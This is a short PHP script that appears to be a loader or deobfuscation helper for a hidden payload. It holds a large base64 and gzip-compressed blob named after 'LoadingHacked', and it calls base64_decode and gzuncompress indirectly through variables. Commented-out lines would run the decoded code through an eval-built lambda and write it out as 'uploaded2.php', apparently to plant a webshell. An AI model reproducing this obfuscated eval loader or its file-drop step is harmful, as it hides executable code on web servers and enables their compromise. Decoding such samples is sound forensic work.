<?php
$func1='printf';
$str1='LoadingHacked';
$ob_end_clean='ob_end_clean';
$return_eval_str='return eval($str1);';
$lambda='__lambda';
$gzuncompress='gzuncompress';
$ob_start='ob_start';
$ob_get_contents='ob_get_contents';
$func1='base64_decode';
$gzuncompress=$func1($gzuncompress);

// if (!function_exists('__lambda')) {
//   function __lambda($sArgs, $sCode) {
//     return eval("return function($sArgs){
//         {$sCode}
//       };"
//     );
//   }
// }

// $lambda = $func1($lambda);
// $return_eval_str = $func1($return_eval_str);
// $func3 = $lambda('$str1', $return_eval_str);
// $ob_end_clean = $func1($ob_end_clean);
// $ob_get_contents = $func1($ob_get_contents);
// $ob_start = $func1($ob_start);

$str1='eNrtWk1vo0gQvUfa/+DDSM5Iowiwk6wV+WDMhyFDO2DAwCWywYM/cHBiJxh+/VZ1Y5zs5jCrXa20o36WklR3V9Wj6nVZit1qMXx5BPTbu5fV0+FH+46aNfrt0SzeLJLWMJvt91dXV+27i9qr9dsFf51fF1i21r+I/l9W2oHY24dTcRXpar9Nl87d+CnUre23ODg4OH5NtOOtLySB+WrovhROi9zUej+CcnPLhiZMTTauH3mpODg4ODg4ODg4OP5v4P/O4ODg4Ph10Z7P9oub7mOyiPNk0b7jFeHg4ODg4PhH+Ph5fyT1hHkpa7afCfZ6nzqeFiWqcWMMnTyWxHU8HPSMoRlbriEFSngMRqkY+sXRWiewZqMthVkhEboWwZoqwpow1oojcR306wSKKlgZ7Cvo4xUYw/KPXeJG8UKJVrBfkgzstQa2d437BM+vTbS76E802Kf+AwnjR2f/DfpbGbMpT9gnItiVE5O1DGeAt6IWNIeOOWKBxUROTv1swNFvctIYIeaA/YYT7le47yypP+WQnPwLUtcFOK3BrqyVcWvoyVui/54mU020BPXW0OSMVGkxXg02E2mpETfFj6tsVyTetHS8ZHP9OtOE3biUn+Yd583Q7c58eliDbbsBGUdKntY90xPP/+65+5Ntgu8sVsAe5eV0W2APFduX1dkKeqgMGi6L0W4cboVbY+S/zDfH4Xgl76LVIDcm6cYWNNvR8/RhOBDuJ5t0ceKhmttAuhaAR+8UJ5KWE2+TQtyeM6lkF59pVslPvmqkDxP4e0QOYWeQfof1aZCo0UZoONQckcMycYk8Pp9B3xWtN/bcJdhzsemHS/vRoboTQWO0f3GJNq2/QjVYUn8R+4H+tJ8i1Yjun7Rc0B7hWiWfes5iumjbVaO7LTlpoDPGHK6P+108P6YcfaZ7RRUt1N1UY5wwPnC2IH6tS5Hqkul2fdZ1hvFRoyLTpMmekWlSoneFxoiP9K5o9RqN42zZ/WI8oVYlPVPzrGvXsbAWrrU666ruWSkPx6PkNazy1FSJ7KnO8325b/rkqWLlbm2wxQPxSPFeK4EoP3iiMw+3WhW5oRBIThZKvU0Ee7GuQe2NXTAZ9B5cITX1fRGJzvCDprTddeTvjPeaWqyTTuLDPRnlnaTjO+/uCehCrpKRWUZBmH+SEzUj0TlD7yDtZ2XhHFIIzAGqAwFrEU6M3f353jxHT+ZyDHbikb3zFOK9KcIAZsqKzb4Fm3sCEU8zzauaOag0919i82BZ5xqUjT7WLD/0KqOcUAM6xlGLRtdbk/USbKoZCWZX5b3rV13/hi/0S3Mkd3udG4qQfloP1IV44jhAjh064yqNzWXkAjZh9aIzjvKlMzLssnqyZ/rz80ANRDZT0d9evaunHblx18I5xOYD1vPFgmllYz11cxlLnkQ04Dglb5Hu5Y02zjFG82m0teD9qJ5VN4YKJ7wD6KGux2l2NWfzdKbvnue6enPSkr1eduZb69ZQM8nNdqjdYZT1XpPzDBVt6agnkCdSksNMsm4aTab9fvvu4uK/f2Pu09+XtfX17u+4v/P9Gccv54SXbfzZ/tak5d/7+/x7fx9rd/mhWax0X+/+AHJ5pAE=';

ob_start();
echo gzuncompress(base64_decode($str1));
$res = ob_get_contents();
$ob_end_clean();

// $file_path = "uploaded2.php";
// file_put_contents($file_path, $res);

// $ob_start();
// $func3($gzuncompress($func1($str1)));
// $res = $ob_get_contents();
// $ob_end_clean();
// echo $res;
?>